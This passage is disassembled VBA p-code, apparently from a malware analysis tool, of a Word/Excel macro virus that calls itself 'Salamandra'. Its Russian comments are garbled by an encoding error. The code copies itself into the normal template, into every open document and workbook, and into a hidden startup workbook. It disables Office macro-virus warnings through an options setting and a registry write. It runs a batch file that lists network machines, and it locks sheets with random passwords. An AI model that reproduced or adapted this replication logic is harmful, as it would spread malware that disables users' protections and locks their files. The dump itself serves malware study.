' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld lon 
' 	For 
' Line #52:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St wor 
' Line #53:
' 	Ld wor 
' 	LitStr 0x0006 " a = 8"
' 	Eq 
' 	IfBlock 
' Line #54:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	QuoteRem 0x0000 0x0049 "‡ ®¤­® ã¡¨à ¥¬ ¢ ª®¤¥ ¯ãáâë¥ áâà®ª¨, â ª¨¬ ®¡à §®¬ § ¯à¥é ¥¬ ¯à¨à®áâ ª®¤ "
' Line #57:
' 	Ld wor 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #58:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld wordik 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld wordik 
' 	ArgsMemCall Quit 0x0000 
' Line #64:
' 	QuoteRem 0x0000 0x003C "’ ª ª ª ¢ íªá¥«¥ ­ è  ª­¨£  áªàëâ , â® ¤®¡ ¢«ï¥¬ ­®¢ãî ª­¨£ã"
' Line #65:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x000E "Salamandra.xls"
' 	Eq 
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #66:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	QuoteRem 0x0000 0x0030 "…á«¨ ¢  ¢â®§ ¯ãáª¥ ­¥â ­¨ç¥£® ¯¨è¥¬ âã¤  ­ è ª®¤"
' Line #69:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #70:
' 	Ld Application 
' 	MemLd StartupPath 
' 	MemStWith LookIn 
' Line #71:
' 	LitStr 0x000E "Salamandra.xls"
' 	MemStWith FileName 
' Line #72:
' 	ArgsMemCallWith Execute 0x0000 
' Line #73:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St nax 
' Line #74:
' 	EndWith 
' Line #75:
' 	Ld nax 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #76:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld vis 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000F "\Salamandra.xls"
' 	Add 
' 	Paren 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #79:
' 	QuoteRem 0x0000 0x0023 "¤¥« ¥¬ § ¯¨áë¢ ¥¬ãî ª­¨£ã ­¥¢¨¤¨¬®©"
' Line #80:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #81:
' 	LitStr 0x000E "Salamandra.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	QuoteRem 0x0000 0x002A "�¥à¥¯¨áë¢ ¥¬ ­ è ª®¤ ¢® ¢á¥ ®âªàëâë¥ ª­¨£¨"
' Line #84:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #85:
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St vr 
' Line #86:
' 	Ld vr 
' 	Ld kol 
' 	Ne 
' 	IfBlock 
' Line #87:
' 	LitDI2 0x0001 
' 	Ld vis 
' 	LitStr 0x000C "thisworkbook"
' 	Ld i 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	QuoteRem 0x0000 0x0045 "�à¨ § ªàëâ¨¨ áâ ¢¨¬ ¯ à®«ì ¯®¤®¡à ­­ë© á«ãç ©­ë¬ ®¡à §®¬ ­  ¢á¥ «¨áâë"
' Line #91:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ne 
' 	IfBlock 
' Line #92:
' 	Ld a 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #93:
' 	ArgsCall Read 0x0000 
' Line #94:
' 	LitStr 0x0000 ""
' 	St parol 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #96:
' 	LitDI2 0x0000 
' 	St par 
' Line #97:
' 	Ld par 
' 	LitDI2 0x0041 
' 	Lt 
' 	While 
' Line #98:
' 	Ld Rnd 
' 	LitDI2 0x005A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St par 
' Line #99:
' 	Wend 
' Line #100:
' 	Ld parol 
' 	Ld par 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St parol 
' Line #101:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #102:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sheets 
' 	MemLd Count 
' 	For 
' Line #103:
' 	Ld parol 
' 	ParamNamed Password 
' 	Ld i 
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemCall Protect 0x0001 
' Line #104:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld kol 
' 	For 
' Line #106:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St prov 
' Line #107:
' 	Ld prov 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0009 "'Password"
' 	Eq 
' 	IfBlock 
' Line #108:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #109:
' 	Ld i 
' 	LitStr 0x000A "'Password="
' 	Ld parol 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	QuoteRem 0x0000 0x0021 "�à¨ ®âªàëâ¨¨ ª­¨£¨ á­¨¬ ¥¬ ¯ à®«ì"
' Line #114:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #115:
' 	LitStr 0x0000 ""
' 	St parol 
' Line #116:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld kol 
' 	For 
' Line #117:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St prov 
' Line #118:
' 	Ld prov 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0009 "'Password"
' 	Eq 
' 	IfBlock 
' Line #119:
' 	Ld prov 
' 	LitDI2 0x000B 
' 	LitDI2 0x0019 
' 	ArgsLd Mid$ 0x0003 
' 	St parol 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #122:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sheets 
' 	MemLd Count 
' 	For 
' Line #123:
' 	Ld parol 
' 	Paren 
' 	Ld i 
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemCall Unprotect 0x0001 
' Line #124:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Private Sub Don())
' Line #129:
' 	QuoteRem 0x0000 0x0019 "“¡¨à ¥¬ à¥ ªæ¨î ­  ®è¨¡ª¨"
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	QuoteRem 0x0000 0x0025 "“¡¨à ¥¬ § ¯à®á ­  ®âª«îç¥­¨¥ ¬ ªà®á®¢"
' Line #132:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #133:
' 	QuoteRem 0x0000 0x002E "“¡¨à ¥¬ § ¯à®á ­  ®âª«îç¥­¨¥ ¬ ªà®á®¢ ¢ �ªá¥«¥"
' Line #134:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #135:
' 	Dim 
' 	VarDefn nor
' 	VarDefn vis
' 	VarDefn parol
' 	VarDefn prov
' 	VarDefn xlpath
' 	VarDefn nax (As String)
' Line #136:
' 	Dim 
' 	VarDefn lon
' 	VarDefn lonvis
' 	VarDefn kol
' 	VarDefn i
' 	VarDefn par (As Integer)
' Line #137:
' 	Ld Documents 
' 	MemLd Count 
' 	St kol 
' Line #138:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lon 
' Line #139:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lonvis 
' Line #140:
' 	LitDI2 0x0001 
' 	Ld lonvis 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St vis 
' Line #141:
' 	QuoteRem 0x0000 0x0017 "‡ ¯¨áë¢ ¥¬ ª®¤ ¢ íªá¥«ì"
' Line #142:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set exl 
' Line #143:
' 	Ld exl 
' 	ArgsMemCall Run 0x0000 
' Line #144:
' 	Ld exl 
' 	MemLd Application 
' 	MemLd StartupPath 
' 	St xlpath 
' Line #145:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #146:
' 	Ld xlpath 
' 	MemStWith LookIn 
' Line #147:
' 	LitStr 0x000E "Salamandra.xls"
' 	MemStWith FileName 
' Line #148:
' 	ArgsMemCallWith Execute 0x0000 
' Line #149:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St nax 
' Line #150:
' 	EndWith 
' Line #151:
' 	Ld nax 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #152:
' 	Ld exl 
' 	MemLd Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #153:
' 	LitDI2 0x0001 
' 	Ld vis 
' 	LitDI2 0x0001 
' 	Ld exl 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #154:
' 	Ld xlpath 
' 	LitStr 0x000F "\Salamandra.xls"
' 	Add 
' 	Paren 
' 	Ld exl 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #155:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #156:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #157:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #160:
' 	LitDI2 0x0003 
' 	LitStr 0x003D "Private Sub Workbook_WindowActivate(ByVal Wn As Excel.Window)"
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #161:
' 	LitDI2 0x0004 
' 	LitStr 0x0006 " a = 8"
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #162:
' 	LitDI2 0x0005 
' 	LitStr 0x0004 " Nod"
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #163:
' 	LitDI2 0x0006 
' 	LitStr 0x0007 "End Sub"
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #164:
' 	QuoteRem 0x0000 0x0023 "¤¥« ¥¬ § ¯¨áë¢ ¥¬ãî ª­¨£ã ­¥¢¨¤¨¬®©"
' Line #165:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld exl 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #166:
' 	LitStr 0x000E "Salamandra.xls"
' 	Ld exl 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #167:
' 	EndIfBlock 
' Line #168:
' 	Ld exl 
' 	ArgsMemCall Quit 0x0000 
' Line #169:
' 	QuoteRem 0x0000 0x002E "§ ¯¨áë¢ ¥¬áï ¢ è ¡«®­ ¨ ¢á¥ ®âªàëâë¥ ¤®ªã¬¥­âë"
' Line #170:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld lon 
' 	Ne 
' 	IfBlock 
' Line #171:
' 	LitDI2 0x0001 
' 	Ld lon 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #172:
' 	LitDI2 0x0001 
' 	Ld vis 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #173:
' 	LitDI2 0x0003 
' 	LitStr 0x0010 "Sub viewvbcode()"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #174:
' 	LitDI2 0x0004 
' 	LitStr 0x008E " NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #175:
' 	LitDI2 0x0005 
' 	LitStr 0x001C " NormalTemplate.Saved = True"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #176:
' 	LitDI2 0x0006 
' 	LitStr 0x001D " For i = 1 To Documents.Count"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #177:
' 	LitDI2 0x0007 
' 	LitStr 0x008B "  Documents(i).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Documents(i).VBProject.VBComponents.Item(1).CodeModule.CountOfLines"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #178:
' 	LitDI2 0x0008 
' 	LitStr 0x001B "  Documents(i).Saved = True"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #179:
' 	LitDI2 0x0009 
' 	LitStr 0x0007 " Next i"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #180:
' 	LitDI2 0x000A 
' 	LitStr 0x0007 "End Sub"
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #181:
' 	EndIfBlock 
' Line #182:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld kol 
' 	For 
' Line #183:
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld lon 
' 	LitDI2 0x0008 
' 	Sub 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #184:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #185:
' 	LitDI2 0x0001 
' 	Ld vis 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #186:
' 	QuoteRem 0x0000 0x006E "“¡¨à ¥¬ ¨§ áª®¯¨à®¢ ­­®£® ª®¤  ¯à®æ¥¤ãàã áªàëâ¨ï ª®¤  â ª ª ª ®­  ¬®¦¥â ¡ëâì â®«ìª® ¢ ¥¤. íª§¥¬¯«ïà¥ ¢ ­®à¬ «¥"
' Line #187:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St gon 
' Line #188:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld gon 
' 	For 
' Line #189:
' 	Ld j 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St wor 
' Line #190:
' 	Ld wor 
' 	LitStr 0x0010 "Sub viewvbcode()"
' 	Eq 
' 	IfBlock 
' Line #191:
' 	Ld j 
' 	LitDI2 0x0008 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #192:
' 	EndIfBlock 
' Line #193:
' 	QuoteRem 0x0000 0x0049 "‡ ®¤­® ã¡¨à ¥¬ ¢ ª®¤¥ ¯ãáâë¥ áâà®ª¨, â ª¨¬ ®¡à §®¬ § ¯à¥é ¥¬ ¯à¨à®áâ ª®¤ "
' Line #194:
' 	Ld wor 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #195:
' 	Ld j 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #200:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #201:
' 	QuoteRem 0x0000 0x0044 "�à¨ ®âªàëâ¨¨ á®§¤ ¥¬ ä ©« ¤«ï ¯®«ãç¥­¨ï á¯¨áª  á¥âª¨ ¨ § ¯ãáª ¥¬ ¥£®"
' Line #202:
' 	LitStr 0x0012 "c:\windows\net.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "c:\windows\net.exe view>c:\windows\net.tmp"
' 	PrintItemNL 
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #205:
' 	LitStr 0x0012 "c:\windows\net.bat"
' 	LitDI2 0x0000 
' 	ArgsLd Shell 0x0002 
' 	St doscom 
' Line #206:
' 	QuoteRem 0x0000 0x0029 "�à¨ ®âªàëâ¨¨ á­¨¬ ¥¬ ãáâ ­®¢«¥­­ë© ¯ à®«ì"
' Line #207:
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #208:
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lonvis 
' Line #209:
' 	LitStr 0x0000 ""
' 	St parol 
' Line #210:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld lonvis 
' 	For 
' Line #211:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St prov 
' Line #212:
' 	Ld prov 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0009 "'Password"
' 	Eq 
' 	IfBlock 
' Line #213:
' 	Ld prov 
' 	LitDI2 0x000B 
' 	LitDI2 0x0019 
' 	ArgsLd Mid$ 0x0003 
' 	St parol 
' Line #214:
' 	EndIfBlock 
' Line #215:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #216:
' 	Ld parol 
' 	Paren 
' 	Ld ThisDocument 
' 	ArgsMemCall Unprotect 0x0001 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	Ld a 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #220:
' 	QuoteRem 0x0000 0x0043 "�à¨ § ªàëâ¨¨ áâ ¢¨¬ ¯ à®«ì ­  ¤®ªã¬¥­â ¯®¤®¡à ­ë© á«ãç ©­ë¬ ®¡à §®¬"
' Line #221:
' 	Ld ThisDocument 
' 	MemLd New 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #222:
' 	ArgsCall Read 0x0000 
' Line #223:
' 	LitStr 0x0000 ""
' 	St parol 
' Line #224:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #225:
' 	LitDI2 0x0000 
' 	St par 
' Line #226:
' 	Ld par 
' 	LitDI2 0x0041 
' 	Lt 
' 	While 
' Line #227:
' 	Ld Rnd 
' 	LitDI2 0x005A 
